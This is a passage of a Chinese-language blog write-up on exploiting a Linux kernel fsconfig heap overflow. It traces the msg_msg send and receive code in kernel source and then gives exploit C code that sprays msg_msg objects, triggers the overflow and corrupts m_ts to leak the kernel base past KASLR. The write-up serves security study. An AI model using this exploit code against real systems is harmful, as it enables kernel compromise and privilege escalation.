<p>其中的关键函数为<code>do_msgsnd</code>，接下来我们逐步进行分析</p>
<p>在我们想要发送消息的时候，<code>do_msgsnd</code>会需要为消息创建空间，他调用的这个函数便是load_msg,如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgsnd</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">long</span> mtype, <span class="hljs-type">void</span> __user *mtext,</span><br><span class="hljs-params">		<span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">int</span> msgflg)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> *<span class="hljs-title">msq</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br>	<span class="hljs-type">int</span> err;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>	DEFINE_WAKE_Q(wake_q);<br><br>	ns = current-&gt;nsproxy-&gt;ipc_ns;<br><br>	<span class="hljs-keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="hljs-type">long</span>) msgsz &lt; <span class="hljs-number">0</span> || msqid &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	<span class="hljs-keyword">if</span> (mtype &lt; <span class="hljs-number">1</span>)<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	msg = load_msg(mtext, msgsz);<br>	<br>	...<br>	<br></code></pre></td></tr></table></figure>

<p>而我们load_msg又是会调用alloc_msg来分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">load_msg</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br>	<span class="hljs-type">int</span> err = -EFAULT;<br>	<span class="hljs-type">size_t</span> alen;<br><br>	msg = alloc_msg(len);<br>	<br>	...<br></code></pre></td></tr></table></figure>

<p>接下来看到alloc_msg函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">alloc_msg</span><span class="hljs-params">(<span class="hljs-type">size_t</span> len)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> **<span class="hljs-title">pseg</span>;</span><br>	<span class="hljs-type">size_t</span> alen;<br><br>	alen = min(len, DATALEN_MSG); 		<span class="hljs-comment">//从len和PAGE_SIZE-sizeof(struct msg_msg)当中取得较小值</span><br>	msg = kmalloc(<span class="hljs-keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);<br>	<span class="hljs-keyword">if</span> (msg == <span class="hljs-literal">NULL</span>)<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>	msg-&gt;next = <span class="hljs-literal">NULL</span>;<br>	msg-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>	len -= alen;<br>	pseg = &amp;msg-&gt;next;<br>	<span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123; 	<span class="hljs-comment">//说明是较大的消息，所以需要msg_msgseg字段</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><br>		cond_resched();<br><br>		alen = min(len, DATALEN_SEG);<br>		seg = kmalloc(<span class="hljs-keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);<br>		<span class="hljs-keyword">if</span> (seg == <span class="hljs-literal">NULL</span>)<br>			<span class="hljs-keyword">goto</span> out_err;<br>		*pseg = seg;<br>		seg-&gt;next = <span class="hljs-literal">NULL</span>;<br>		pseg = &amp;seg-&gt;next;<br>		len -= alen;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> msg;<br><br>out_err:<br>	free_msg(msg);<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其中通过源码大致可以看出，当分配大于PAGE_SIZE的时候，会额外增加msg_msgseg来存储消息正文，其中分配标志为<code>GFP_KERNEL_ACCOUNT</code></p>
<h2 id="2-msgrcv"><a href="#2-msgrcv" class="headerlink" title="2.msgrcv"></a>2.msgrcv</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">ksys_msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-keyword">struct</span> msgbuf __user *msgp, <span class="hljs-type">size_t</span> msgsz,</span><br><span class="hljs-params">		 <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill);<br>&#125;<br><br>SYSCALL_DEFINE5(msgrcv, <span class="hljs-type">int</span>, msqid, <span class="hljs-keyword">struct</span> msgbuf __user *, msgp, <span class="hljs-type">size_t</span>, msgsz,<br>		<span class="hljs-type">long</span>, msgtyp, <span class="hljs-type">int</span>, msgflg)<br>&#123;<br>	<span class="hljs-keyword">return</span> ksys_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>同send一样，他同样是调用<code>do_msgrcv</code>来操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> __user *buf, <span class="hljs-type">size_t</span> bufsz, <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg,</span><br><span class="hljs-params">	       <span class="hljs-type">long</span> (*msg_handler)(<span class="hljs-type">void</span> __user *, <span class="hljs-keyword">struct</span> msg_msg *, <span class="hljs-type">size_t</span>))</span><br>&#123;<br>	<span class="hljs-type">int</span> mode;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> *<span class="hljs-title">msq</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>, *<span class="hljs-title">copy</span> =</span> <span class="hljs-literal">NULL</span>;<br>	DEFINE_WAKE_Q(wake_q);<br><br>	...<br>	<br>	bufsz = msg_handler(buf, msg, bufsz);<br>	free_msg(msg);<br>	<span class="hljs-keyword">return</span> bufsz;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>最终调用了msg_handler函数指针，这在最开始是传入了<code> do_msg_fill</code>作为函数指针，所以相当于最终调用了<code>do_msg_fill</code>，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msg_fill</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *dest, <span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">size_t</span> bufsz)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msgbuf</span> __<span class="hljs-title">user</span> *<span class="hljs-title">msgp</span> =</span> dest;<br>	<span class="hljs-type">size_t</span> msgsz;<br><br>	<span class="hljs-keyword">if</span> (put_user(msg-&gt;m_type, &amp;msgp-&gt;mtype))<br>		<span class="hljs-keyword">return</span> -EFAULT;<br><br>	msgsz = (bufsz &gt; msg-&gt;m_ts) ? msg-&gt;m_ts : bufsz;<br>	<span class="hljs-keyword">if</span> (store_msg(msgp-&gt;mtext, msg, msgsz))<br>		<span class="hljs-keyword">return</span> -EFAULT;<br>	<span class="hljs-keyword">return</span> msgsz;<br>&#125;<br><br><span class="hljs-comment">/* message buffer for msgsnd and msgrcv calls */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msgbuf</span> &#123;</span><br>	<span class="hljs-type">__kernel_long_t</span> mtype;          <span class="hljs-comment">/* type of message */</span><br>	<span class="hljs-type">char</span> mtext[<span class="hljs-number">1</span>];                  <span class="hljs-comment">/* message text */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure>

<p>其中将我们传入的buf，作为<code>msgbuf</code>结构，然后将其中<code>msgp-&gt;mtext</code>作为真正的dest进行拷贝，其中调用<code>strore_msg</code>函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">store_msg</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *dest, <span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>	<span class="hljs-type">size_t</span> alen;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><br>	alen = min(len, DATALEN_MSG);<br>	<span class="hljs-keyword">if</span> (copy_to_user(dest, msg + <span class="hljs-number">1</span>, alen))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>	<span class="hljs-keyword">for</span> (seg = msg-&gt;next; seg != <span class="hljs-literal">NULL</span>; seg = seg-&gt;next) &#123;<br>		len -= alen;<br>		dest = (<span class="hljs-type">char</span> __user *)dest + alen;<br>		alen = min(len, DATALEN_SEG);<br>		<span class="hljs-keyword">if</span> (copy_to_user(dest, seg + <span class="hljs-number">1</span>, alen))<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在do_msgrcv当中若msgflg带有<code>MSG_COPY</code>，会走到下面这段函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> __user *buf, <span class="hljs-type">size_t</span> bufsz, <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg,</span><br><span class="hljs-params">	       <span class="hljs-type">long</span> (*msg_handler)(<span class="hljs-type">void</span> __user *, <span class="hljs-keyword">struct</span> msg_msg *, <span class="hljs-type">size_t</span>))</span><br>&#123;<br>	<span class="hljs-type">int</span> mode;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> *<span class="hljs-title">msq</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>, *<span class="hljs-title">copy</span> =</span> <span class="hljs-literal">NULL</span>;<br>	DEFINE_WAKE_Q(wake_q);<br><br>	ns = current-&gt;nsproxy-&gt;ipc_ns;<br><br>	<span class="hljs-keyword">if</span> (msqid &lt; <span class="hljs-number">0</span> || (<span class="hljs-type">long</span>) bufsz &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	<span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br>		<span class="hljs-keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		copy = prepare_copy(buf, <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));<br>		<span class="hljs-keyword">if</span> (IS_ERR(copy))<br>			<span class="hljs-keyword">return</span> PTR_ERR(copy);<br>	&#125;<br>	<br>	...<br>	<br></code></pre></td></tr></table></figure>

<p>其中会调用<code>prepare_copy</code>函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">prepare_copy</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *buf, <span class="hljs-type">size_t</span> bufsz)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">copy</span>;</span><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Create dummy message to copy real message to.</span><br><span class="hljs-comment">	 */</span><br>	copy = load_msg(buf, bufsz);<br>	<span class="hljs-keyword">if</span> (!IS_ERR(copy))<br>		copy-&gt;m_ts = bufsz;<br>	<span class="hljs-keyword">return</span> copy;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里是拷贝我们的一个预留msg_msg结构体用来存放消息，然后我们回到msgrcv</p>
<p>由于我们假设本次加上了<code>MSG_COPY</code>标志位，那么接下来会进行到下面这段代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">	<span class="hljs-keyword">for</span> (;;) &#123;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_receiver</span> <span class="hljs-title">msr_d</span>;</span><br><br>			...<br>			<br>			msg = find_msg(msq, &amp;msgtyp, mode);<br>			<br>			...<br>			<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * If we are copying, then do not unlink message and do</span><br><span class="hljs-comment">			 * not update queue parameters.</span><br><span class="hljs-comment">			 */</span><br>			<span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br>				msg = copy_msg(msg, copy); 			<span class="hljs-comment">//复制我们的msg,但并不unlink，这里的返回msg是我们的dst，也就是copy这个参数</span><br>				<span class="hljs-keyword">goto</span> out_unlock0;<br>			&#125;<br><br>			...<br>			<br>		&#125;<br>		<br>		...<br>		<br>out_unlock0:<br>	ipc_unlock_object(&amp;msq-&gt;q_perm);<br>	wake_up_q(&amp;wake_q);<br>out_unlock1:<br>	rcu_read_unlock();<br>	<span class="hljs-keyword">if</span> (IS_ERR(msg)) &#123;<br>		free_copy(copy);<br>		<span class="hljs-keyword">return</span> PTR_ERR(msg);<br>	&#125;<br><br>	bufsz = msg_handler(buf, msg, bufsz);<br>	free_msg(msg); 		<span class="hljs-comment">//最后释放copy</span><br><br>	<span class="hljs-keyword">return</span> bufsz;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>该段函数由于咱们传入的<code>MSG_COPY</code>标志位，导致其中我们接受的消息并不会进行下面的列表unlink操作，而是直接复制到临时msg，然后通过msg_handler（也就是do_msg_fill函数）传入给我们的用户区buf，最后释放掉我们刚刚创建的临时msg</p>
<h1 id="五、漏洞利用"><a href="#五、漏洞利用" class="headerlink" title="五、漏洞利用"></a>五、漏洞利用</h1><h2 id="1-基地址泄露"><a href="#1-基地址泄露" class="headerlink" title="1.基地址泄露"></a>1.基地址泄露</h2><p>首先我们假设其处于真实环境，所以应开的保护基本都需要开启，目前我们先来解决一下KASLR导致的地址随机化问题</p>
<p>题目中我们需要泄露基地址，我们选用msg_msg搭配seq_operations的手法</p>
<p>我们现在已知的一个溢出为内核堆上的legacy_data后的溢出，因此我们如何利用legacy_data下一页的内容呢？这时我们可以想到使用堆喷的技巧，在这里我们选则使用msg_msg来进行堆喷，其中是因为他大小可控，且若申请大小大于一页，则会额外申请<code>msg_msgseg</code>结构体来继续存储消息，其二是因为他的分配标志为<code>GFP_KERNEL_COUNT</code>,他刚好同之前我们的fsconfig中申请的fc-&gt;private，也就是legacy_data相一致，如果此处选用<code>GFP_KERNEL</code>的结构体则会存在隔离情况，这个加上COUNT的标志位一般从<code>kmalloc-cg-*</code>来分配，后面不带COUNT的则从<code>kmalloc-*</code>分配</p>
<p>过程我打算就按照will的wp进行复现，其中的堆喷技巧也值得借鉴</p>
<p>首先我们要知道大致的堆喷范围，这里我们可以使用命令</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>slabinfo<br></code></pre></td></tr></table></figure>

<p>查看一下自己本机的情况大致了解一下，我本机的内核版本是6.2</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/ae51f3deb48f8c54ff34121e7c292df5e0fe7f18.jpg" srcset="/img/loading.gif" lazyload></p>
<p>由于我们这个属于大块，在分配的时候也是使用kmalloc_large来分配，所以相应的slab也较大，其中objperslab为8，也就是说同一个slab里面有8个这样的obj,所以我们的堆喷范围大概就是在这个范围左右</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">do_leak</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">uint64_t</span> kernel_base;<br>    <span class="hljs-type">char</span> pat[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x2000</span>] = &#123;<span class="hljs-number">0</span>&#125;, recieved[<span class="hljs-number">0x2000</span>] = &#123;<span class="hljs-number">0</span>&#125;;      <span class="hljs-comment">//PAGE_SIZE*2</span><br>    <span class="hljs-type">int</span> targets[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    msg* message = (msg* )(buffer); <br>    <span class="hljs-type">int</span> size = <span class="hljs-number">0x1018</span>;      <br>    <span class="hljs-comment">/* msg_msg: (0x30)head, (0xfd0)message_0</span><br><span class="hljs-comment">     * msg_msgseg: (0x8)head, (0x18)message_1, for kmalloc-32 :)</span><br><span class="hljs-comment">     * */</span><br>    <br>    <span class="hljs-comment">/* spray the msg_msg */</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)&#123;<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0x41</span>+i, <span class="hljs-keyword">sizeof</span>(buffer));<br>        targets[i] = get_msg(IPC_PRIVATE, <span class="hljs-number">0666</span>|IPC_CREAT);<br>        send_msg(targets[i], message, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);      <span class="hljs-comment">/* spray the 0x1018 msg_msg from the kmalloc-4k */</span><br>    &#125;<br><br></code></pre></td></tr></table></figure>

<p>我们首先采取堆喷八个msg_msg，但是这里注意我们的消息长度为(0x1018 - 0x30)，这是为了保证我们可以增添一个额外的msgseg,这样可以，这里由于我们是要搭配后来的<code>seq_operations</code>，因此我们特意构造留给msg_msgseg的大小为0x18,也就是总共加上他的头为0x20，这样可以为我们之后的堆喷打基础:)</p>
<p>堆喷过后，我们正常利用fsconfig来构造溢出的临界状态，然后再继续进行堆喷，此处的目的是为了更大概率的使得我们溢出到msg_msg的头部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-built_in">memset</span>(pat, <span class="hljs-number">0x42</span>, <span class="hljs-keyword">sizeof</span>(pat));<br>   pat[<span class="hljs-keyword">sizeof</span>(pat) - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>   <br>   <br>   info_log(<span class="hljs-string">&quot;Opening the ext4 filesystem&quot;</span>);<br>   fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>   <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>       <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Opening&quot;</span>);<br>       <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>   &#125;<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">186</span>; i++) &#123;<br>       fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>   &#125;<br>   fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">/* overflow, hopefully causes an OOB read on a potential msg_msg object below */</span><br>   info_log(<span class="hljs-string">&quot;Overflowing...&quot;</span>);<br>   pat[<span class="hljs-number">21</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>   <span class="hljs-type">char</span> evil[] = <span class="hljs-string">&quot;\x60\x10&quot;</span>;<br>   <span class="hljs-comment">/* it will write 23(21 + &#x27;,&#x27; + &#x27;=&#x27;) bytes</span><br><span class="hljs-comment">    * but the up(4095) reserve &#x27;\x00&#x27;, one byte</span><br><span class="hljs-comment">    * so this time we overflow 22 byte </span><br><span class="hljs-comment">    * */</span><br>   fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, pat, <span class="hljs-number">0</span>);<br>   <br>   <span class="hljs-comment">// spray more msg_msg</span><br>   <span class="hljs-comment">/* it will spray the legacy data in some one spraying obj </span><br><span class="hljs-comment">    * that is because kmalloc-cg-4k from a 8K chunk :)</span><br><span class="hljs-comment">    * it could include 8 kmalloc-cg-4k</span><br><span class="hljs-comment">    * we can use cmd [sudo cat /proc/slabinfo] for checking</span><br><span class="hljs-comment">    * */</span><br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">8</span>; i &lt; <span class="hljs-number">0x10</span>; i++) <br>   &#123;<br>       <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0x41</span>+i, <span class="hljs-keyword">sizeof</span>(buffer));<br>       targets[i] = get_msg(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>       send_msg(targets[i], message, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br>   &#125;<br>   <br>   info_log(<span class="hljs-string">&quot;overflow the msg-&gt;m_ts&quot;</span>);<br>   fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, evil, <span class="hljs-number">0</span>);<br><br></code></pre></td></tr></table></figure>

<p>最后的fsconfig实际上就是在大概率写到msg_msg头部的情况下覆盖msg_msg-&gt;m_ts字段，制造出一个大数字的读取,下图就是我们恰好堆喷到我们溢出的部分</p>
